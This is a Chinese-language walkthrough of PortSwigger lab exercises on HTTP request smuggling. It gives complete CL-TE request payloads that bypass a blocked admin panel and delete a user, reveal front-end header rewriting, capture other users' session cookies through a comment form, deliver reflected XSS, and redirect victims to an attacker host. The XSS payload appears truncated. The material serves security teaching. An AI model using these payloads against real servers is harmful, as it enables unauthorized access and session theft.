### 攻击方式的应用与实验环境

在上文中，我们简要介绍了几种攻击方式。接下来，我们将探讨这些攻击方式的具体应用，并通过实验环境来帮助理解与复现。

#### 1. 绕过前端安全控制 (Bypass Front-end Security Controls)

本部分提供了两个实验环境：一个是基于 CL-TE 形式的 [Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)，另一个是基于 TE-CL 形式的 [Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)。这两个实验的最终目标相同，我们将选择 CL-TE 形式进行演示。

**实验背景：**
该实验涉及一个前端和后端服务器，其中前端服务器不支持分块编码。有一个管理员面板位于 `/admin`，但前端服务器阻止了对该路径的访问。

**实验步骤：**

1. **生成 LAB 后，尝试直接访问 `/admin`**：
   - 访问结果会显示 `"Path /admin is blocked"`，表明无法通过常规方式访问。
   
2. **利用 HTTP Smuggling 访问 `/admin`**：
   - 发送以下数据包两次：
     ```http
     POST / HTTP/1.1
     Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net
     User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
     Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
     Accept-Encoding: gzip, deflate
     Connection: close
     Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a
     Content-Length: 28
     Transfer-Encoding: chunked
     0
     GET /admin HTTP/1.1
     ```

3. **添加 HOST 头再次发送请求**：
   - 如果成功，将看到 `/admin` 的响应内容。如果失败，可以多次尝试。
   - 请求示例：
     ```http
     POST / HTTP/1.1
     Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net
     User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
     Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
     Accept-Encoding: gzip, deflate
     Connection: close
     Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a
     Content-Length: 45
     Transfer-Encoding: chunked
     0
     GET /admin HTTP/1.1
     Host: localhost
     ```

4. **删除用户 carlos**：
   - 构造如下数据包：
     ```http
     POST / HTTP/1.1
     Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net
     User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
     Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
     Accept-Encoding: gzip, deflate
     Connection: close
     Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a
     Content-Length: 63
     Transfer-Encoding: chunked
     0
     GET /admin/delete?username=carlos HTTP/1.1
     Host: localhost
     ```

**注意事项：**
- 计算 `Content-Length` 值时需要考虑所有字段的字节数。
- TE-CL 形式的攻击方法类似，此处不再赘述。

#### 2. 揭露前端请求重写 (Revealing Front-end Request Rewriting)

某些网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段再转发。这些字段可能包括 TLS 连接协议、XFF 头或用户会话令牌 ID 等。

**实验步骤：**

1. **找到能够输出请求参数值的 POST 请求**。
2. **将该参数放在消息末尾**。
3. **走私该请求并发送普通请求，以获取前端服务器添加或重写的字段**。

**实验环境：**
[Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)

**实验背景：**
- 前端服务器不支持分块编码。
- 管理员面板位于 `/admin`，仅允许 IP 地址为 `127.0.0.1` 的用户访问。
- 前端服务器会在请求中添加包含用户 IP 地址的自定义头。

**实验步骤：**

1. **尝试搜索任意内容（如 123）**：
   - 搜索结果会回显到响应中。

2. **利用搜索回显泄露前端服务器添加的请求头**：
   - 构造如下数据包：
     ```http
     POST / HTTP/1.1
     Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net
     User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
     Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
     Accept-Encoding: gzip, deflate
     Connection: close
     Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a
     Content-Length: 103
     Transfer-Encoding: chunked
     0
     POST / HTTP/1.1
     Content-Length: 70
     Content-Type: application/x-www-form-urlencoded
     search=123
     ```

3. **隐藏前端服务器添加的请求头**：
   - 通过 body 方式隐藏其他前端服务器添加的请求头，从而访问管理员面板。

**注意事项：**
- `Content-Length` 值的计算需准确。
- 不添加 `Content-Type` 字段时，需在最后添加 `\r\n`。

#### 3. 捕获其他用户的请求 (Capturing other users' requests)

**实验环境：**
[Lab: Exploiting HTTP request smuggling to capture other users' requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)

**实验背景：**
- 前端服务器不支持分块编码。
- 目标是走私请求，使下一个用户的请求被存储在应用程序中，然后使用受害者的 cookie 访问其账户。

**实验步骤：**

1. **找到评论功能**：
   - 利用评论处进行 HTTP Smuggling。

2. **构造请求包**：
   - 示例请求包：
     ```http
     POST / HTTP/1.1
     Host: ac951f7d1e9ea625803c617f003f005c.web-security-academy.net
     User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
     Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
     Accept-Encoding: gzip, deflate
     Connection: close
     Cookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At
     Upgrade-Insecure-Requests: 1
     Cache-Control: max-age=0
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 271
     Transfer-Encoding: chunked
     0
     POST /post/comment HTTP/1.1
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 600
     Cookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At
     csrf=oIjWmI8aLjIzqX18n5mNCnJieTnOVWPN&postId=5&name=1&email=1%40qq.com&website=http%3A%2F%2Fwww.baidu.com&comment=1
     ```

3. **查看评论处获取其他用户的请求头**。

**注意事项：**
- `Content-Length` 值需足够大，以便捕获下一个用户的请求。

#### 4. 利用反射型 XSS (Exploit Reflected XSS)

**实验环境：**
[Lab: Exploiting HTTP request smuggling to exploit reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)

**实验背景：**
- 前端服务器不支持分块编码。
- 应用程序存在通过 `User-Agent` 头进行的反射型 XSS 漏洞。

**实验步骤：**

1. **发现反射型 XSS 漏洞**：
   - 在 `User-Agent` 头中插入恶意脚本。

2. **构造请求包**：
   - 示例请求包：
     ```http
     POST / HTTP/1.1
     Host: ac811f011e27d43b80301693005a0007.web-security-academy.net
     User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
     Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
     Accept-Encoding: gzip, deflate
     Connection: close
     Cookie: session=iSxMvTrkiVN2G5N7EF7MTKgXGRE6A5xZ
     Upgrade-Insecure-Requests: 1
     Content-Length: 150
     Transfer-Encoding: chunked
     0
     GET /post?postId=5 HTTP/1.1
     User-Agent: ">
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 5
     x=1
     ```

3. **访问任意页面触发弹窗**。

**注意事项：**
- 结合 HTTP Smuggling 和反射型 XSS 可以实现更复杂的攻击。

#### 5. 将站内跳转转换为开放重定向 (Turn An On-Site Redirect Into An Open Redirect)

**实验场景：**
- 目标站点在使用 30x 跳转时，使用 `Host` 头进行跳转。例如，在 Apache 或 IIS 服务器上，一个 URI 最后不带 `/` 的请求会被 30x 导向带 `/` 的地址。

**实验步骤：**

1. **发送以下请求**：
   - 示例请求：
     ```http
     GET /home HTTP/1.1
     Host: normal-website.com
     ```

2. **响应结果**：
   - 响应结果：
     ```http
     HTTP/1.1 301 Moved Permanently
     Location: https://normal-website.com/home/
     ```

3. **结合 HTTP Smuggling 进行攻击**：
   - 示例请求：
     ```http
     POST / HTTP/1.1
     Host: vulnerable-website.com
     Content-Length: 54
     Transfer-Encoding: chunked
     0
     GET /home HTTP/1.1
     Host: attacker-website.com
     Foo: X
     ```

4. **走私后的请求**：
   - 请求将被拼接成：
     ```http
     GET /home HTTP/1.1
     Host: attacker-website.com
     Foo: XGET /scripts/include.js HTTP/1.1
     Host: vulnerable-website.com
     ```

通过以上实验，我们可以更好地理解和防范这些攻击方式。希望这些示例能帮助您提升对网络安全的理解。